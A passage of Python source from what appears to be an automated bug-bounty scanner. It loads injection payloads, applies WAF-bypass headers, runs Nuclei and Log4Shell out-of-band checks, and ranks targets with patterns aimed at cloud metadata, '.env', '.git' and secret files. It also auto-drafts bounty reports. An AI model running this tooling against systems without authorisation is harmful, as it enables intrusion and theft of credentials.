                                 if _score_map_inj.get(
                                     urllib.parse.urlparse(e).path.rstrip('/') or '/', 0.0) > 0]
                _unscored_rest = [e for e in ends if e not in set(_scored_front)]
                ends = _scored_front + injected + _unscored_rest
            else:
                # No H1 scores — put injected at front so cap always reaches them
                ends = injected + ends
        param_ends = [e for e in ends if _is_injectable(e)]
        if injected:
            log.info(f"[scan] injected {len(injected)} param URLs (prepended after scored) "
                     f"-- now {len(param_ends)} with injectable params")
        else:
            log.debug(f"[scan] no param injection needed ({len(param_ends)} injectable params from real endpoints)")

    def emit(e): 
        q.put(e)
        # Also emit to live feed queue for /scan/feed SSE
        try:
            import app as _app
            fq = _app._scan_queues.get(f"feed:{domain}")
            if fq and not fq.full(): fq.put_nowait(e)
        except Exception: pass

    # ── Pre-load H1 intelligence payloads into thread-local ───────────────────
    # Written to _tl.h1_payloads so check_xss_bypass / check_sqli_bypass /
    # check_ssrf / check_lfi / check_ssti can read them via _tl_h1_payloads().
    # Previously this was a local dict that was loaded but never consumed.
    _tl.h1_payloads = {}
    try:
        from engine.h1_ingest import get_payloads as _h1_get_payloads
        for _bt in ["xss","sqli","ssrf","lfi","ssti","rce","cors","redirect"]:
            _pl = _h1_get_payloads(_bt, 20)
            if _pl:
                _tl.h1_payloads[_bt] = _pl
        if _tl.h1_payloads:
            log.info(f"[scan] H1 payloads loaded for: {sorted(_tl.h1_payloads.keys())} "
                     f"(prepended to check functions via _tl_h1_payloads)")
    except Exception as _h1pe:
        log.debug(f"[scan] H1 payloads unavailable: {_h1pe}")

    # ── Pre-cache H1 endpoint recommendations (single pass, thread-local) ─────
    # Walks the top-50 scored endpoints, fetches get_recommendations() once per
    # unique normalised path, stores result in _tl.h1_ep_recs.
    # Cost: O(min(50, len(ends))) DB queries before the scan loop starts.
    # check functions read from _tl.h1_ep_recs[norm_path] — zero extra DB hits.
    _tl.h1_ep_recs   = {}   # norm_path → get_recommendations() result
    _tl.h1_param_map = {}   # param_name → sorted [bug_type, ...] from PARAM_BUG_MAP
    try:
        from engine.h1_intel import get_recommendations as _h1_get_rec, PARAM_BUG_MAP as _H1_PBM
        from engine.h1_ingest import _normalise_endpoint as _h1_norm_ep
        # Only cache recommendations for endpoints that already have an H1 score
        # (zero-score endpoints get no recommendation — avoids useless queries)
        _scored_paths = set(_tl.h1_score_map.keys())
        _seen_norms   = set()
        _rec_count    = 0
        for _ep_url in ends[:50]:
            try:
                _ep_path = urllib.parse.urlparse(_ep_url).path
                _ep_norm = _h1_norm_ep(_ep_path)
                if _ep_norm in _seen_norms:
                    continue
                _seen_norms.add(_ep_norm)
                # Only fetch if this path has any H1 signal
                if _ep_norm not in _scored_paths and not any(
                    seg in _ep_norm for seg in ['/api','/admin','/auth','/graphql',
                                                '/upload','/export','/webhook']):
                    continue
                _rec = _h1_get_rec(_ep_path)
                if _rec.get("matched_bugs") or _rec.get("surfaces"):
                    _tl.h1_ep_recs[_ep_norm] = _rec
                    _rec_count += 1
            except Exception:
                pass
        if _tl.h1_ep_recs:
            log.info(f"[h1] pre-cached recommendations for {_rec_count} endpoint paths")
        # Also build param→bugs map from static PARAM_BUG_MAP (zero DB cost)
        _tl.h1_param_map = dict(_H1_PBM)
    except Exception as _h1_rec_e:
        log.debug(f"[h1] rec pre-cache: {_h1_rec_e}")

    # ── Activity Feed: attach live [TESTING]/[RESULT] emitter (isolated) ──────
    try:
        from engine import activity_feed as _af
        _af.attach(domain, emit)
    except Exception: pass
    try:
        from engine.scanner_depth import reset_dedup
    except Exception: pass
    # Auto-validator: verify findings before saving (xbow-style)
    try:
        from engine.validator import filter_fps as _filter_fps, validate as _validate_finding
        _USE_VALIDATOR = True
    except Exception:
        _USE_VALIDATOR = False
        _filter_fps = lambda x, **kw: x
        _validate_finding = lambda f, **kw: (True, "no_validator")
    try:
        from engine.scanner_depth import reset_dedup as _reset_dedup
        _reset_dedup()
    except Exception: pass


    def save(f, bug):
        # Hard cap: stop saving after MAX_FINDINGS to prevent memory explosion
        _finding_count[0] += 1
        if _finding_count[0] > MAX_FINDINGS:
            log.warning(f"[scan] MAX_FINDINGS ({MAX_FINDINGS}) reached — suppressing")
            return
        f["bug"] = bug; f["type"] = bug
        # Risk score every finding as it's saved
        try:
            from engine.risk_engine import score_finding
            risk = score_finding(f)
            f["risk_score"]       = risk.get("risk_score", 0)
            f["estimated_damage"] = risk.get("estimated_damage", "")
            f["fix_priority"]     = risk.get("fix_priority", "")
            f["exploitability"]   = risk.get("exploitability", 0)
            f["business_impact"]  = risk.get("business_impact", 0)
            f["impact_narrative"] = risk.get("impact_narrative", "")
        except: pass
        # RAG Intelligence: pattern-score every finding for instant validation
        try:
            from engine.rag_intel import score_artifact as _rag_score
            _rag = _rag_score(url=f.get("url",""), body=f.get("poc","")+" "+f.get("value",""))
            if _rag["candidates"]:
                f["rag_top_vuln"]  = _rag["candidates"][0]["vuln"]
                f["rag_score"]     = _rag["candidates"][0]["score"]
                f["rag_evidence"]  = _rag["evidence"][:3]
                # Adjust confidence based on RAG score
                if _rag["confidence"] > 0.7:
                    f["confidence"] = min(99, int(f.get("confidence",50)) + 10)
                elif _rag["confidence"] < 0.2:
                    f["confidence"] = max(1, int(f.get("confidence",50)) - 15)
        except: pass
        # HTTP re-verification for critical findings (async, non-blocking)
        # ── EIL Auto-Validation: triggered for all confirmed findings ─────────
        # Runs asynchronously — does not block scan progress.
        # Updates confidence, evidence, and DB in background.
        try:
            _sev = f.get("severity","info")
            _bug = f.get("bug","")
            if _sev in ("critical","high") and f.get("url","") and _bug:
                def _eil_validate():
                    try:
                        from engine.validation_engine import auto_validate as _eil_av
                        log.info(
                            f"[nuclei→eil] validating finding"
                            f" type={bug} url={url[:70]}"
                        )
                        _eil_av(f, db=db, domain=domain, timeout=10)
                        _conf = f.get("eil_confidence", f.get("confidence",50))
                        _conf_state = "passed" if f.get("eil_confirmed") else "failed"
                        log.info(
                            f"[eil] auto_validate {_conf_state}"
                            f" bug={_bug} conf={_conf}"
                            f" proof={f.get('eil_proof','')[:60]}"
                        )
                        # Feed result back into payload intelligence v2
                        try:
                            from engine.payload_manager import (
                                record_payload_success as _v2_succ,
                                record_payload_failure as _v2_fail,
                            )
                            _payload = f.get("payload","") or f.get("proof","")[:80]
                            _family  = f.get("nuclei_template","") or _bug
                            _param   = f.get("param","")
                            if f.get("eil_confirmed"):
                                _v2_succ(_bug, _payload,
                                         url=f.get("url","")[:100],
                                         param=_param, family=_family)
                            else:
                                _v2_fail(_bug, _payload,
                                         reason=f.get("eil_proof","")[:80],
                                         family=_family)
                        except Exception as _fbe:
                            log.debug(f"[payload-v2] feedback: {_fbe}")

                        if f.get("eil_confirmed"):
                            emit({"type":"eil_validated","bug":_bug,
                                  "url":f.get("url","")[:80],
                                  "confidence":_conf,
                                  "proof":f.get("eil_proof","")[:80]})
                        else:
                            emit({"type":"eil_validation_failed","bug":_bug,
                                  "url":f.get("url","")[:80],
                                  "reason":f.get("eil_proof","")[:80],
                                  "confidence":_conf})
                    except Exception as _ev:
                        log.debug(f"[eil] auto_validate error: {_ev}")
                threading.Thread(target=_eil_validate, daemon=True).start()
        except: pass

        try:
            if f.get("severity","info") == "critical" and f.get("url",""):
                def _http_verify():
                    try:
                        from engine.validator import validate as _validate_http
                        _is_confirmed, _reason = _validate_http(f, timeout=6)
                        if not _is_confirmed:
                            db.update_finding(domain, f.get("url",""), f.get("bug",""),
                                              {"likely_fp": True, "fp_reason": _reason, "http_verified": False})
                            log.info(f"[validator] HTTP check: likely FP — {_reason[:60]}")
                        else:
                            db.update_finding(domain, f.get("url",""), f.get("bug",""),
                                              {"http_verified": True, "verify_reason": _reason})
                    except Exception as _ve:
                        log.debug(f"[validator] {_ve}")
                threading.Thread(target=_http_verify, daemon=True).start()
        except: pass
        # AI auto-enhancement: add CVSS, H1 title, fix, chain tip (async, non-blocking)
        try:
            _api_key = os.environ.get("ANTHROPIC_API_KEY","")
            if _api_key and f.get("severity","info") in ("critical","high"):
                def _ai_enhance():
                    try:
                        from engine.ai_agent import enhance_finding, triage_finding
                        enhanced = enhance_finding(f, domain=domain)
                        triage   = triage_finding(f)
                        _patch   = {k: v for k,v in enhanced.items() if v and k not in f}
                        _patch["ai_priority"]       = triage.get("priority","P2")
                        _patch["ai_score"]          = triage.get("score",6.0)
                        _patch["ai_bounty"]         = triage.get("estimated_bounty",0)
                        _patch["ai_tip"]            = triage.get("tip","")
                        _patch["ai_quick_win"]      = triage.get("quick_win",False)
                        if _patch:
                            db.update_finding(domain, f.get("url",""), f.get("bug",""), _patch)
                            emit({"type":"ai_tip","bug":bug,"url":f.get("url",""),
                                  "tip":triage.get("tip",""), "priority":triage.get("priority","P2"),
                                  "bounty":triage.get("estimated_bounty",0)})
                    except Exception as _ae:
                        log.debug(f"[ai_enhance] {_ae}")
                threading.Thread(target=_ai_enhance, daemon=True).start()
        except: pass
        # AI Coach: quick heuristic validation + confidence adjustment
        try:
            from engine.ai_coach import quick_validate
            _is_tp, _conf_delta, _reason = quick_validate(f)
            if _conf_delta != 0:
                f["confidence"] = max(1, min(99, f.get("confidence",50) + _conf_delta))
            if not _is_tp and f.get("confidence",50) < 25:
                f["likely_fp"] = True
                f["fp_reason"] = _reason
                log.debug(f"[coach] Likely FP: {f.get('bug','')} @ {f.get('url','')[:50]} — {_reason}")
        except Exception: pass
        # ── XBOW Evidence Grade: stamp each finding before DB save ──────────
        try:
            from engine.xbow_validator import validate_evidence as _xbow_ev
            _xbow = _xbow_ev(f)
            f["_xbow_grade"]         = _xbow["grade"]
            f["_xbow_verdict"]       = _xbow["verdict"]
            f["_xbow_evidence_score"] = _xbow["evidence_score"]
            f["_xbow_report_ready"]  = _xbow["report_ready"]
            f["_xbow_analyst_note"]  = _xbow["analyst_note"]
            f["_xbow_missing"]       = _xbow["missing"]
            # Downgrade finding if XBOW says it's insufficient
            if _xbow["verdict"] == "likely_fp":
                f["likely_fp"]  = True
                f["fp_reason"]  = _xbow.get("fp_risk","")
                f["confidence"] = max(1, f.get("confidence",50) - 20)
            elif _xbow["verdict"] == "insufficient_evidence":
                f["confidence"] = max(1, f.get("confidence",50) - 10)
            # Upgrade severity if XBOW confirms strong evidence
            elif _xbow["verdict"] == "confirmed" and _xbow["grade"] in ("A","B"):
                f["_xbow_confirmed"] = True
        except Exception as _xbe:
            log.debug(f"[xbow] grade error: {_xbe}")

        # ── Mythos root cause analysis ────────────────────────────────────────
        try:
            from engine.mythos_analyzer import analyze_root_cause as _mythos_rc
            _rc = _mythos_rc(f)
            f["_mythos_assumption"]   = _rc.get("broken_assumption","")
            f["_mythos_trust_boundary"]= _rc.get("trust_boundary","")
            f["_mythos_chain_risk"]   = _rc.get("chain_risk_score", 0)
            f["_mythos_root_cause"]   = _rc.get("likely_root_cause","")
            f["_mythos_hypothesis"]   = _rc.get("hypothesis","")
        except Exception as _mbe:
            log.debug(f"[mythos] analysis error: {_mbe}")

        # ── Hacktron PoC||GTFO gate ───────────────────────────────────────────
        try:
            if _ELITE_ENGINES:
                _gtfo_ok, _gtfo_reason, f = _gtfo_check(f)
                if not _gtfo_ok:
                    log.debug(f"[gtfo] downgraded: {f.get('bug')} @ {f.get('url','')[:50]}: {_gtfo_reason}")
                # Auto-generate PoC if missing
                if not f.get("poc") or len(str(f.get("poc",""))) < 20:
                    _auto = _auto_poc(f)
                    if _auto:
                        f["poc"] = _auto
                # Add patch suggestion
                if not f.get("_patch_suggestion"):
                    f["_patch_suggestion"] = _patch_suggest(f)
        except Exception as _gtfo_err:
            log.debug(f"[gtfo] error: {_gtfo_err}")

        db.add_finding(domain, f)
        emit({**f, "type": "finding"})

        # ── Bounty auto-draft: EIL-validated findings trigger draft creation ──
        # Fires for confirmed findings and high-confidence needs_review.
        # Rejected (confidence < 40, eil_confirmed=False) are silently skipped.
        # Runs in a daemon thread so it never blocks the scan pipeline.
        try:
            _b_conf  = f.get("eil_confidence", f.get("confidence", 0))
            _b_conf_ok  = f.get("eil_confirmed") or _b_conf >= 50
            _b_sev   = f.get("severity","info")
            _b_url   = f.get("url","")
            _b_worth = _b_sev in ("critical","high","medium") or _b_conf >= 70
            # Hard rules: never draft for info/low severity or empty URL
            if not _b_url or _b_sev in ("info","low"):
                _b_worth = False
            if _b_conf_ok and _b_worth:
                def _auto_draft(finding=dict(f)):
                    try:
                        from engine.bounty_report import create_draft as _bcd
                        from pathlib import Path as _BPath
                        import json as _bj
                        # Load programs for scope gate
                        _progs = []
                        try:
                            _pp = _BPath(__file__).parent / "data" / "programs.json"
                            if _pp.exists():
                                _progs = _bj.loads(_pp.read_text())
                        except Exception:
                            pass
                        _result = _bcd(domain, finding, _progs)
                        _rid    = _result.get("report_id")
                        if _rid:
                            _scope  = _result.get("scope", {})
                            _status = _result.get("status","")
                            log.info(
                                f"[bounty] auto_draft_created"
                                f" finding_id={finding.get('id','?')}"
                                f" report_id={_rid}"
                                f" bug={finding.get('bug','')}"
                            )
                            # ── State promotion ────────────────────────────────
                            # confirmed + scope_verified=true → ready_for_review
                            # confirmed + no scope            → needs_review
                            if _scope.get("verified") and _scope.get("in_scope"):
                                from engine.bounty_db import set_status as _bss
                                _bss(_rid, "ready_for_review")
                                _status = "ready_for_review"
                                log.info(
                                    f"[bounty] scope_verified=true"
                                    f" report_id={_rid}"
                                    f" program={_scope.get('program','')}"
                                )
                                log.info(
                                    f"[bounty] auto_promoted_to_ready_for_review"
                                    f" id={_rid}"
                                )
                            else:
                                from engine.bounty_db import set_status as _bss
                                _bss(_rid, "needs_review")
                                _status = "needs_review"
                                _reason = _scope.get("reason","scope_not_verified")
                                log.info(
                                    f"[bounty] needs_review"
                                    f" reason={_reason}"
                                    f" report_id={_rid}"
                                )
                            emit({"type":         "bounty_draft_created",
                                  "report_id":    _rid,
                                  "bug":          finding.get("bug",""),
                                  "severity":     finding.get("severity",""),
                                  "url":          finding.get("url","")[:100],
                                  "status":       _status,
                                  "scope":        _scope.get("in_scope", False),
                                  "program":      _scope.get("program","")})
                        else:
                            log.debug(
                                f"[bounty] auto_draft skipped:"
                                f" {_result.get('error','unknown')}"
                                f" conf={_b_conf}"
                            )
                    except Exception as _be:
                        log.debug(f"[bounty] auto_draft error: {_be}")
                threading.Thread(target=_auto_draft, daemon=True, name="bounty-draft").start()
        except Exception:
            pass
        # Persist successful payload to brain DB for future scans
        try:
            _payload = f.get("payload","") or f.get("value","")
            if _payload and f.get("confidence",0) >= 70:
                from engine.agentic_loop import record_success as _brain_record
                _brain_record(f.get("bug",""), _payload, list(tech_stack)[:5], url=f.get("url",""))
        except Exception: pass
        # Real-time notification — routes through safe triage path
        if notifier:
            try:
                _sev  = f.get("severity","info").lower()
                _conf = int(f.get("confidence",0) or 0)
                log.info(f"[notify-flow] scanner_save → queue_finding"
                         f" id={id(f)&0xFFFF:04x} severity={_sev} confidence={_conf}")
                notifier.queue_finding(f, domain)
            except Exception as _nex:
                log.debug(f"[notify-flow] queue_finding error: {_nex}")
        # AI validation pipeline — bounded thread pool (max 4), non-blocking, safe mode only
        try:
            import concurrent.futures as _avpool, sys as _sys
            _avmod = _sys.modules[__name__]
            if not getattr(_avmod, "_ai_validate_pool", None):
                _avmod._ai_validate_pool = _avpool.ThreadPoolExecutor(
                    max_workers=4, thread_name_prefix="ai-validate")
            _vf = dict(f); _vf["domain"] = domain
            def _run_ai_validate(_finding=_vf):
                try:
                    from engine.ai_validator import ai_validate_finding as _avf
                    _avf(_finding, mode="safe")
                except Exception: pass
            _avmod._ai_validate_pool.submit(_run_ai_validate)
        except Exception: pass

    counts = {b: 0 for b in bugs}
    for bug in bugs:
        emit({"type": "scan_start", "bug": bug})

    # ── Phase -1: WAF Detection (informs all other phases) ──────────────────
    _waf_bypass_hdrs = {}
    if _ELITE_ENGINES:
        try:
            for _t in targets[:3]:
                _whdrs = get_waf_bypass_headers(_t)
                if _whdrs: _waf_bypass_hdrs = _whdrs; break
            if _waf_bypass_hdrs:
                log.info(f"[scan] WAF bypass headers active: {list(_waf_bypass_hdrs.keys())[:4]}")
        except: pass

    # ── Phase 0: JS Deep Analysis (auto-adds endpoints) ───────────────────
    try:
        from engine.js_analyzer import analyze_all_js
        js_results = analyze_all_js(ends, domain)
        new_routes = 0
        for r in js_results:
            for secret in r.get("secrets", []):
                # JS secrets → immediate finding
                finding = F("jsleak", secret.get("severity","high"), r["url"],
                            f"JS Secret: {secret['type']}",
                            secret_type=secret["type"],
                            preview=secret["value"],
                            line=str(secret.get("line","")),
                            impact="Exposed credentials allow direct service access")
                save(finding, "jsleak")
                counts["jsleak"] = counts.get("jsleak",0) + 1
            for route in r.get("routes", []):
                if route.startswith("http"):
                    if route not in ends:
                        ends.append(route)
                        db.add_endpoint(domain, route)
                        new_routes += 1
        if new_routes:
            log.info(f"[js] added {new_routes} new routes from JS analysis")
            emit({"type":"step","name":"js_deep","state":"done",
                  "meta":f"{new_routes} new API routes discovered"})
    except Exception as e:
        log.warning(f"js deep analysis in scan: {e}")

    # ── Phase 1: Nuclei (runs in background, parallel to custom checks) ──────
    # Don't block -- submit nuclei as a future alongside custom checks
    nuclei_future = None
    if targets and _nuclei_bin():
        import concurrent.futures as _cf_nuclei
        _nuclei_exe = _cf_nuclei.ThreadPoolExecutor(max_workers=1)

        # ── Pre-filter: nuclei ONLY runs against httpx-alive HTTP(S) URLs ─────
        # Raw domains (no scheme) and non-HTTP targets are silently skipped.
        # Nuclei requires full URLs; feeding bare domains causes template mismatch.
        _raw_targets = [t for t in targets if t.startswith(("http://", "https://"))]

        # ── Phase 4: Nuclei file fallback — same source as scanner ────────────
        # If ends is empty (DB had 0 endpoints), load from exported files
        _nuclei_ep_source = "db"
        _nuclei_ends = list(ends) if ends else []
        if not _nuclei_ends:
            try:
                from pathlib import Path as _NFPath
                _nf_dir = _NFPath(__file__).parent / "data" / "exports" / domain
                if _nf_dir.exists():
                    _nf_urls: list = []
                    for _nf in ["crawled.txt", "params.txt", "api.txt"]:
                        _nfp = _nf_dir / f"{domain}_{_nf}"
                        if _nfp.exists():
                            for _nl in _nfp.read_text(errors="replace").splitlines():
                                _nl = _nl.strip()
                                if _nl.startswith("http"):
                                    _nf_urls.append(_nl)
                    _nf_urls = list(dict.fromkeys(_nf_urls))
                    if _nf_urls:
                        _nuclei_ends = _nf_urls
                        _nuclei_ep_source = "file"
                        log.info(f"[nuclei] endpoints_input={len(_nuclei_ends)}"
                                 f" source=file fallback={_nf_dir}")
            except Exception as _nfe:
                log.warning(f"[nuclei] file fallback failed: {_nfe}")

        if not _nuclei_ends:
            _nuclei_ep_source = "fallback_hosts"
            _nuclei_ends = _raw_targets  # use live hosts at minimum
            log.info(f"[nuclei] endpoints_input={len(_nuclei_ends)} source=fallback_hosts")
        else:
            log.info(f"[nuclei] endpoints_input={len(_nuclei_ends)} source={_nuclei_ep_source}")

        # Replace ends reference for nuclei scoring
        ends_for_nuclei = _nuclei_ends


        _NOISE_PARAMS = re.compile(
            r'[?&](utm_\w+|fbclid|gclid|msclkid|_ga|_gid|ref=|'
            r'nocache=|cb=|cache_bust=)([&]|$)', re.I
        )
        _STATIC_EXTS = re.compile(
            r'/[^?#]*\.(png|jpg|jpeg|gif|svg|ico|webp|woff|woff2|ttf|eot|otf'
            r'|css|map|pdf|zip|tar|gz|mp4|mp3|avi|mov)(\?|#|$)', re.I
        )
        _CDN_PATTERNS = re.compile(
            r'(cdn\.|cloudfront\.net|akamaihd\.net|fastly\.net'
            r'|googleapis\.com|gstatic\.com|bootstrapcdn\.com'
            r'|jquery\.com|unpkg\.com|cdnjs\.cloudflare\.com)', re.I
        )

        def _score_bounty(url):
            """Score endpoint for bug-bounty payout potential (0-900)."""
            s = 0; u = url.lower()
            if re.search(r'[?&](url|uri|dest|destination|redirect|callback|'
                         r'webhook|src|fetch|proxy|host|endpoint|target|'
                         r'return|next|path|continue)=', url, re.I): s += 250
            if any(p in u for p in ['169.254','metadata','cloud','aws','gcp',
                                     'azure','internal','localhost']): s += 250
            if any(p in u for p in ['/admin','/administrator','/manager',
                                     '/dashboard','/panel','/cp/',
                                     '/login','/signin','/auth',
                                     '/payment','/billing','/checkout',
                                     '/account','/profile']): s += 220
            if any(p in u for p in ['/api/','/v1/','/v2/','/v3/','/v4/',
                                     '/rest/','/graphql','/query']) and '?' in url: s += 200
            if any(p in u for p in ['/upload','/import','/export','/download',
                                     '/file','/attachment','file=','filename=']): s += 180
            if any(p in u for p in ['/oauth','/saml','/sso','/oidc',
                                     '/callback','/token','/authorize']): s += 160
            if any(p in u for p in ['.env','.git','.htaccess','config',
                                     'backup','.bak','.log','.sql','secret']): s += 150
            if any(p in u for p in ['/graphql','/swagger','/openapi',
                                     '/api-docs','/redoc','/graphiql']): s += 100
            if '?' in url: s += 60
            return s

        _ep_candidates = []
        _seen_norm: set = set()
        for ep in (ends_for_nuclei[:5000] if ends_for_nuclei else []):
            ep_str = ep if isinstance(ep, str) else ep.get("url", "")
            if not ep_str.startswith(("http://", "https://")): continue
            if _STATIC_EXTS.search(ep_str): continue
            if _CDN_PATTERNS.search(ep_str): continue
            norm = _NOISE_PARAMS.sub('?', ep_str).rstrip('?&')
            if norm in _seen_norm: continue
            _seen_norm.add(norm)
            score = _score_bounty(ep_str)
            if score > 0:
                _ep_candidates.append((score, ep_str))

        _ep_candidates.sort(key=lambda x: -x[0])
        _ep_urls = [u for _, u in _ep_candidates]
        _all_candidates = list(dict.fromkeys(_raw_targets + _ep_urls))
        if len(_all_candidates) >= 100:
            _cutoff = max(50, int(len(_all_candidates) * 0.30))
            _nuclei_targets = _all_candidates[:_cutoff]
        else:
            _nuclei_targets = _all_candidates

        # Always include 401/403 admin/API paths for misconfig templates
        _misconfig_extras = [u for u in _ep_urls if
                             any(p in u.lower() for p in ['/admin','/api/','/v1/','/manage'])
                             and u not in _nuclei_targets][:20]
        _nuclei_targets = list(dict.fromkeys(_nuclei_targets + _misconfig_extras))

        log.info(
            f"[nuclei] scoring complete:"
            f" live={len(_raw_targets)}"
            f" scored_eps={len(_ep_candidates)}"
            f" high_value_targets={len(_nuclei_targets)}"
            f" (rule: {'top30%' if len(_all_candidates)>=100 else 'all<100'})"
        )

        # ── Phase 1: Pre-execution diagnostic logs ───────────────────────────
        # Every field required by /nuclei/debug. These fire BEFORE the scan starts
        # so the operator can verify targets before waiting for results.
        _ep_count = len(db.get_endpoints(domain, limit=1) or [])  # fast existence check
        _all_eps  = db.get_endpoints(domain, limit=20000)
        _ep_count = len(_all_eps) if _all_eps else 0

        log.info(f"[nuclei] domain={domain}")
        log.info(f"[nuclei] endpoints_from_db={_ep_count}")
        log.info(f"[nuclei] live_targets={len(_raw_targets)}")
        log.info(f"[nuclei] high_value_targets={len(_nuclei_targets)}")
        log.info(f"[nuclei] targets_sample={[t[:60] for t in _nuclei_targets[:5]]}")

        if not _nuclei_targets:
            log.warning("[nuclei] high_value_targets=0 — scan skipped")
            emit({"type": "nuclei_skipped",
                  "reason": "no_high_value_targets",
                  "endpoints_from_db": _ep_count,
                  "live_targets":      len(_raw_targets),
                  "high_value_targets": 0,
                  "msg": "Nuclei skipped: no high-value targets found"})
            _rm(tmp_nuclei) if 'tmp_nuclei' in dir() else None
            nuclei_future = None

        if _nuclei_targets:
            tmp_nuclei = _tmp(_nuclei_targets)
        else:
            tmp_nuclei = None


        def _run_nuclei():
            try:
                results = []
                _received   = [0]   # mutable counter for closure
                _confirmed  = [0]

                def _nuclei_emit(finding):
                    """Stream nuclei findings live to the SSE queue, with confirmation gate."""
                    # Hard gate: reject diagnostics, info severity, and empty URLs
                    if finding.get("nuclei_diagnostic") or finding.get("severity","") in ("info","low"):
                        log.debug(f"[nuclei] suppressed diagnostic/info finding: {finding.get('title','')[:60]}")
                        return
                    if not finding.get("url",""):
                        log.debug("[nuclei] suppressed finding with empty URL")
                        return
                    _received[0] += 1
                    bug = finding.get("bug", "cve")
                    sev = finding.get("severity", "info")
                    url = finding.get("url", "")

                    # ── Confirmation gate ─────────────────────────────────────
                    _NEEDS_CONFIRM = {"sqli", "xss", "ssrf", "ssti", "xxe", "rce", "lfi"}
                    if bug in _NEEDS_CONFIRM and url and sev in ("critical", "high"):
                        param   = finding.get("param", "")
                        payload = finding.get("payload", finding.get("value", ""))
                        _cv = _confirm_finding(bug, url, param, payload)
                        if not _cv["confirmed"]:
                            # Tag as needs_review instead of silently dropping
                            finding["status"]     = "needs_review"
                            finding["source"]     = "nuclei"
                            finding["confidence"] = max(40, finding.get("confidence",50) - 20)
                            finding["proof"]      = f"unconfirmed: {_cv['proof'][:80]}"
                            log.debug(
                                f"[nuclei] {bug} needs_review at {url[:60]}: "
                                f"{_cv['proof'][:60]}"
                            )
                            # Save as needs_review but don't count as confirmed
                            finding["dedup_key"] = f"nuclei:{bug}:{url}:{finding.get('nuclei_template','')}:nr"
                            save(finding, bug)
                            results.append(finding)
                            return
                        finding["proof"]      = _cv["proof"]
                        finding["confidence"] = _cv["confidence"]
                        log.info(
                            f"[nuclei] CONFIRMED {bug.upper()} @ {url[:70]} "
                            f"— {_cv['proof'][:60]}"
                        )
                    else:
                        finding.setdefault(
                            "proof",
                            f"nuclei template match: {finding.get('nuclei_template','')}"
                        )
                        finding.setdefault("confidence", 88)

                    _confirmed[0] += 1
                    _dedup_key = f"nuclei:{bug}:{url}:{finding.get('nuclei_template','')}"
                    finding["source"]    = "nuclei"
                    finding["dedup_key"] = _dedup_key[:48]

                    if bug in counts:
                        counts[bug] += 1
                    save(finding, bug)
                    results.append(finding)

                    emit({
                        "type":     "scan_done",
                        "bug":      bug,
                        "count":    counts.get(bug, 1),
                        "sev":      sev,
                        "title":    finding.get("title", ""),
                        "url":      url,
                        "template": finding.get("nuclei_template", ""),
                        "proof":    finding.get("proof", ""),
                        "tool":     "nuclei",
                    })

                from engine.nuclei_engine import scan as _nscan, get_binary
                binary = get_binary()
                if binary:
                    with open(tmp_nuclei) as _tf:
                        _nuclei_input = [l.strip() for l in _tf if l.strip()]
                    log.info(
                        f"[nuclei] starting scan: {len(_nuclei_input)} targets"
                        f" | binary={binary}"
                        f" | flags=-json -silent -l targets.txt"
                    )
                    _nscan(
                        targets=_nuclei_input,
                        bugs=bugs,
                        include_cves=("cve" in bugs or "smartcve" in bugs or not bugs),
                        max_time=600,
                        emit_fn=_nuclei_emit,
                        tech_stack=_scan_tech,
                    )
                else:
                    for f in _nuclei(tmp_nuclei, bugs):
                        _nuclei_emit(f)

                log.info(
                    f"[nuclei] {_received[0]} results received"
                    f" | {_confirmed[0]} passed confirmation"
                    f" | {_received[0] - _confirmed[0]} suppressed"
                )
                log.info(f"[nuclei] confirmed={_confirmed[0]}")

                # ── Phase 7: SSE health panel + human-readable status ─────────
                _needs_review_count = sum(
                    1 for r in results if r.get("status") == "needs_review"
                )
                _confirmed_count = _confirmed[0]
                if _confirmed_count > 0:
                    _status_msg = f"Nuclei confirmed: {_confirmed_count} high-confidence findings"
                elif _needs_review_count > 0:
                    _status_msg = (f"Nuclei ran: {len(_nuclei_targets)} targets,"
                                   f" {_received[0]} raw results, {_needs_review_count} need review")
                elif _received[0] > 0:
                    _status_msg = (f"Nuclei ran: {len(_nuclei_targets)} targets,"
                                   f" {_received[0]} raw results, 0 confirmed")
                else:
                    _status_msg = (f"Nuclei ran: {len(_nuclei_targets)} targets, 0 findings")

                emit({"type":          "nuclei_health",
                      "binary":        bool(binary),
                      "targets_loaded": len(_nuclei_targets),
                      "targets_scanned": len(_nuclei_targets),
                      "raw_results":   _received[0],
                      "confirmed":     _confirmed_count,
                      "needs_review":  _needs_review_count,
                      "fallback_used": False,
                      "status_msg":    _status_msg})
                return results
            finally:
                _rm(tmp_nuclei)
        try:
            import concurrent.futures as _cf
            _fresh_exe = _cf.ThreadPoolExecutor(max_workers=1, thread_name_prefix="nuclei")
            nuclei_future = _fresh_exe.submit(_run_nuclei)
            log.info("[scan] nuclei running in background — results confirmed via _confirm_finding()")
        except (RuntimeError, Exception) as _nex:
            log.warning(f"[scan] nuclei executor failed: {_nex} — running inline")
            nuclei_future = None
            try:
                _run_nuclei()
            except Exception as _ne2:
                log.warning(f"[scan] nuclei inline failed: {_ne2}")

    # ── Phase 2: OOB-enhanced Log4Shell ───────────────────────────────────
    if "log4j" in bugs and oob_host:
        try:
            log4j_findings = check_log4j_oob(targets, oob_host)
            for f in log4j_findings:
                counts["log4j"] = counts.get("log4j",0) + 1
                save(f, "log4j")
        except Exception as e:
            log.warning(f"log4j oob: {e}")
        emit({"type":"scan_done","bug":"log4j","count":counts.get("log4j",0)})

    # ── Phase 3: Authenticated surface scan ───────────────────────────────
    auth_targets = []
    if _auth_session and _auth_session.logged_in:
        log.info(f"[scan] authenticated as {_auth_session.username} -- scanning auth surface")
        emit({"type":"step","name":"auth_scan","state":"run",
              "meta":f"Scanning as {_auth_session.username}"})
        auth_targets = targets[:]  # same targets, but requests will carry auth

    # ── Phase 4: Custom checks (parallel, WAF-bypass-aware) ───────────────
    import signal as _signal
    from concurrent.futures import TimeoutError as _TimeoutError

    # Per-bug hard time limits (seconds) -- prevents any one check from running forever
    BUG_TIMEOUTS = {
        "expose":          60,   # 61 hosts × 120 paths but parallel
        "actuator":        60,
        "cors":            90,
        "graphql":         60,
        "saml":            60,
        "oauth":           60,
        "jwt":             60,
        "panels":          60,
        "redirect":        90,
        "crlf":            60,
        "takeover":        30,
        "jsleak":          60,
        "xss":            120,   # WAF-bypass XSS: capped endpoints
        "sqli":           120,   # error-based fast, time-based has own timeout
        "lfi":             90,
        "ssrf":            90,
        "ssti":            60,
        "idor":            60,
        "xxe":             60,
        "rce":             60,
        "deserialization": 30,
        "prototype":       30,
        "fileupload":      30,
        "buckets":         30,
        "nosqli":          60,
        "log4j":           30,
